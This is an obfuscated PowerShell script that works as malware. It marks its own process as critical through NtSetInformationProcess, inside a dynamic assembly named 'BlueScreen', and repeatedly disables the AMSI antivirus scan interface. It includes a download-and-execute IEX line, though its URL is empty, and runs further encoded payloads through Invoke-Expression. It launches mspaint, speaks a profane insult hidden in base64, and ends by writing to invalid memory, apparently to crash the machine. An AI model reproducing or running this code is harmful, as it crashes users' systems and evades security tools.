function Set-Crit
{
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = 'High')]
    Param (
        [Switch]
        $Force,
        [Switch]
        $ExitImmediately
    )
    if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
    {
        throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBsAGUAdgBhAHQAZQBkACAAUABvAHcAZQByAFMAaABlAGwAbAAgAHAAcgBvAG0AcAB0AC4A')))
    }
    ${/\______/\/=\____} = $True
    if (!$Force)
    {
        ${/\______/\/=\____} = $psCmdlet.ShouldContinue($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('eAB5AHoA'))))
    }
    if (!${/\______/\/=\____})
    {
        return
    }
    ${/=\/=\/\_/\/\/=\/} = New-Object System.Reflection.AssemblyName($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBsAHUAZQBTAGMAcgBlAGUAbgA='))))
    ${_/=\___/\__/===\_} = [AppDomain]::CurrentDomain.DefineDynamicAssembly(${/=\/=\/\_/\/\/=\/}, [Reflection.Emit.AssemblyBuilderAccess]::Run)
    ${_/\_/\/\/==\/\___} = ${_/=\___/\__/===\_}.DefineDynamicModule($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBsAHUAZQBTAGMAcgBlAGUAbgA='))), $False)
    ${__/\_/=====\/\/\_} = ${_/\_/\/\/==\/\___}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBsAHUAZQBTAGMAcgBlAGUAbgAuAFcAaQBuADMAMgAuAG4AdABkAGwAbAA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEMAbABhAHMAcwA='))))
    ${_/\___/=\___/\_/\} = ${__/\_/=====\/\/\_}.DefinePInvokeMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB0AFMAZQB0AEkAbgBmAG8AcgBtAGEAdABpAG8AbgBQAHIAbwBjAGUAcwBzAA=='))),
                                                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgB0AGQAbABsAC4AZABsAGwA'))),
                                                        ([Reflection.MethodAttributes] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAFMAdABhAHQAaQBjAA==')))),
                                                        [Reflection.CallingConventions]::Standard,
                                                        [Int32],
                                                        [Type[]] @([IntPtr], [UInt32], [IntPtr].MakeByRefType(), [UInt32]),
                                                        [Runtime.InteropServices.CallingConvention]::Winapi,
                                                        [Runtime.InteropServices.CharSet]::Auto)
    ${_/=\_/=\_/=\/==\/} = ${__/\_/=====\/\/\_}.CreateType()
    ${_/\/==\/==\/\_/==} = [Diagnostics.Process]::GetCurrentProcess().Handle
    ${___/\___/\/=\____} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(4)
    ${___/\__/\/==\/\/=} = 29
    ${_/\__/=\/\/=\____} = 4
    try
    {
        $null = ${_/=\_/=\_/=\/==\/}::NtSetInformationProcess(${_/\/==\/==\/\_/==}, ${___/\__/\/==\/\/=}, [Ref] ${___/\___/\/=\____}, ${_/\__/=\/\/=\____})
    }
    catch
    {
        return
    }
    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('eAB5AHoA')))
    if ($ExitImmediately)
    {
        kill -Id $PID
    }
}
Set-Crit
[Ref].Assembly.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAA==')))+$($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAAxACAANgBEACAANwAzACAANgA5ACAANQA1ACAANwA0ACAANgA5ACAANgBDACAANwAzAA=='))).Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{${01110000001110110}=${01110000001110110}+$_};${01110000001110110})).GetField($($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NgAxACAANgBEACAANwAzACAANgA5ACAANAA5ACAANgBFACAANgA5ACAANwA0ACAANAA2ACAANgAxACAANgA5ACAANgBDACAANgA1ACAANgA0AA=='))).Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{${10000110000110011}=${10000110000110011}+$_};${10000110000110011}),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA=')))).SetValue($null,$true) ; ${10111100011001010} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEA')));${00111001100001010} = 'ms';${10000100001001000} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQB0AGkAbABzAA==')));${10001100000111011} = [Ref].Assembly.GetType(($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwAH0AewAxAH0AaQB7ADIAfQA='))) -f ${10111100011001010},${00111001100001010},${10000100001001000}));${01011100010110100} = ${10001100000111011}.GetField(($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQB7ADAAfQBpAEkAbgBpAHQARgBhAGkAbABlAGQA'))) -f ${00111001100001010}),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA='))));${01011100010110100}.SetValue($null,$true) ;  IEX(New-Object Net.WebClient).downloadString($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('')))) ; Speak $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('4oCcYmluZyBjaGluZ2x5Ij8gQXJlIHlvdSBmdWNraW5nIGtpZGRpbmcgbWU/IEkgc3BlbnQgYSBkZWNlbnQgcG9ydGlvbiBvZiBteSBsaWZlIHdyaXRpbmcgYWxsIG9mIHRoYXQgYW5kIHlvdXIgcmVzcG9uc2UgdG8gbWUgaXMgImJpbmcgY2hpbmdseSI/IEFyZSB5b3Ugc28gbWVudGFsbHkgaGFuZGljYXBwZWQgdGhhdCB0aGUgb25seSB3b3JkIHlvdSBjYW4gY29tcHJlaGVuZCBpcyAiYmluZyBjaGluZ2x5IiAtIG9yIGFyZSB5b3UganVzdCBzb21lIGZ1Y2tpbmcgYXNzaG9sZSB3aG8gdGhpbmtzIHRoYXQgd2l0aCBzdWNoIGEgc2hvcnQgcmVzcG9uc2UsIGhlIGNhbiBtYWtlIGEgc3RhdGVtZW50IGFib3V0IGhvdyBtZWFuaW5nbGVzcyB3aGF0IHdhcyB3cml0dGVuIHdhcz8gV2VsbCwgSSdsbCBoYXZlIHlvdSBrbm93IHRoYXQgd2hhdCBJIHdyb3RlIHdhcyBOT1QgbWVhbmluZ2xlc3MsIGluIGZhY3QsIEkgZXZlbiBoYWQgbXkgd3JpdHRlbiB3b3JrIHByb29mLXJlYWQgYnkgc2V2ZXJhbCBwcm9mZXNzb3JzIG9mIGxpdGVyYXR1cmUuIERvbid0IGJlbGlldmUgbWU/IEkgZG91YnQgeW91IHdvdWxkLCBhbmQgeW91ciByZXNwb25zZSB0byB0aGlzIHdpbGwgcHJvYmFibHkgYmUgImJpbmcgY2hpbmdseSIgb25jZSBhZ2Fpbi4gRG8gSSBnaXZlIGEgZnVjaz8gTm8sIGRvZXMgaXQgbG9vayBsaWtlIEkgZ2l2ZSBldmVuIHRoZSBzbGlnaHRlc3QgZnVjayBhYm91dCBlbGV2ZW4gZnVja2luZyBsZXR0ZXJzPyBJIGJldCB5b3UgdG9vayB0aGUgdGltZSB0byB0eXBlIHRob3NlIGVsZXZlbiBsZXR0ZXJzIHRvbywgSSBiZXQgeW91IHNhdCB0aGVyZSBhbmQgY2h1Y2tsZWQgdG8geW91cnNlbGYgZm9yIDIwIGhlYXJ0eSBzZWNvbmRzIGJlZm9yZSBwcmVzc2luZyAic2VuZCIuIFlvdSdyZSBzbyBmdWNraW5nIHBhdGhldGljLiBJJ20gaG9uZXN0bHkgY29uc2lkZXJpbmcgZGlyZWN0aW5nIHlvdSB0byBhIHBzeWNoaWF0cmlzdCwgYnV0IEknbSBzaW1wbHkgZmFyIHRvbyBuaWNlIHRvIGRvIHNvbWV0aGluZyBsaWtlIHRoYXQuIFlvdSwgaG93ZXZlciwgd2lsbCBnbyBvdXQgb2YgeW91ciB3YXkgdG8gbWFrZSBhIGZvb2wgb3V0IG9mIHNvbWVvbmUgYnkgcmVzcG9uZGluZyB0byBhIHdlbGwtdGhvdWdodC1vdXQsIGludGVsbGlnZW50LCBvciBodW1vcm91cyBzdGF0ZW1lbnQgdGhhdCBwcm9iYWJseSB0b29rIGxvbmdlciB0byB3cml0ZSB0aGFuIHlvdSBjYW4gbGFzdCBpbiBiZWQgd2l0aCBhIGNoaW1wYW56ZWUuIFdoYXQgZG8gSSBoYXZlIHRvIHNheSB0byB5b3U/IEFic29sdXRlbHkgbm90aGluZy4gSSBjb3VsZG4ndCBiZSBib3RoZXJlZCB0byByZXNwb25kIHRvIHN1Y2ggYSB3b3J0aGxlc3MgYXR0ZW1wdCBhdCBhIHJlc3BvbnNlLiBEbyB5b3Ugd2FudCAiYmluZyBjaGluZ2x5IiBvbiB5b3VyIGdyYXZlc3RvbmU='))) ; [Ref].Assembly.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAA==')))+$($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAAxACAANgBEACAANwAzACAANgA5ACAANQA1ACAANwA0ACAANgA5ACAANgBDACAANwAzAA=='))).Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{${01110000001110110}=${01110000001110110}+$_};${01110000001110110})).GetField($($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NgAxACAANgBEACAANwAzACAANgA5ACAANAA5ACAANgBFACAANgA5ACAANwA0ACAANAA2ACAANgAxACAANgA5ACAANgBDACAANgA1ACAANgA0AA=='))).Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{${10000110000110011}=${10000110000110011}+$_};${10000110000110011}),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA=')))).SetValue($null,$true) ; iNVokE-eXpREsSIoN( new-oBjECt  io.COmPResSIon.deFLatEStReAm([Io.MEmorYstReaM] [cONveRT]::froMbASe64strINg( 'yy0uSMzMK9FLrUgFAA==') , [syStEm.Io.COMprEsSIoN.cOmPREssIONmODE]::DeComprEsS )|forEACH-OBjeCT{ new-oBjECt  SyStEM.io.STREaMReaDeR( $_,[sYSTeM.TeXT.enCodiNG]::asCiI ) }|FOrEacH-ObjeCt {$_.REAdToEnD( ) }) ; IEx( "$(SET-vAriABLE 'OFS'  '')"+[StriNg][cHaR[]](109,115, 112 ,97 ,105,110,116, 46, 101 ,120 , 101)+" $( Set-item 'vARIABLe:oFs' ' ') " ) ;  ( [RUnTime.INTERopsERVIcEs.MaRsHAL]::PtrTostringAutO([RunTiME.iNTERopServices.MaRSHaL]::SeCuREStrINgTObsTR($('76492d1116743f0423413b16050a5345MgB8AEUAWgBRADMAegB3AGQAcwBKAHUAagBnADYAUgAzADgAQQA3AG4AUQBuAEEAPQA9AHwAMwBmAGMAYQAwAGYAOAA0AGYAMQBkAGUANQBkAGUAZgAyADcAYwBmADgAZAA2ADUAMgBmADQAZAA1ADYAZABjAGIAZAA4AGUAMAAwAGUANgA2AGQAMwBkAGYAYwBhAGIANQBjADIANAA0ADgAZQA0ADUANAAwADUANQBmADkAZAA='| coNVERTto-sECUREStRiNg -K  (253..238)))))|.( $PshOmE[21]+$PSHOMe[34]+'X') ; ${    }  =  +$(  )  ;  ${  }  =${    };  ${     }=  ++  ${    }  ;${      }  =++  ${    };  ${           }=  ++${    };  ${          }  =++  ${    };  ${   }  =++${    }  ;${            }=  ++${    }  ;${         }=  ++  ${    }  ;  ${       }  =++${    }  ;${        }=++${    };${ }="["+"$(@{})  "[  ${         }]+  "$(@{})"["${     }"+"${        }"  ]+  "$(@{}  )"[  "${      }"+  "${  }"  ]+"$?  "[${     }  ]+"]"  ;${    }  ="".("$(@{  })  "["${     }${          }"]  +"$(@{  })  "["${     }${            }"  ]+"$(@{  })"[  ${  }  ]+"$(@{  })  "[${          }]  +"$?"[${     }  ]  +"$(  @{}  )  "[${           }])  ;  ${    }="$(@{  })"[  "${     }${          }"  ]  +  "$(  @{})  "[${          }]+"${    }"[  "${      }${         }"]  ;  .${    }  ("  ${ }${     }${  }${        }+  ${ }${     }${     }${   }  +  ${ }${     }${     }${      }+${ }${        }${         }+${ }${     }${  }${   }+${ }${     }${     }${  }  +  ${ }${     }${     }${            }+  ${ }${          }${            }+  ${ }${     }${  }${     }+${ }${     }${      }${  }  +${ }${     }${  }${     }|  ${    }  "); [Ref]::[System.Runtime.InteropServices.Marshal]::AllocHGlobal(1024) | % {[System.Runtime.InteropServices.Marshal]::WriteByte($_, 1, 0xFF)} 
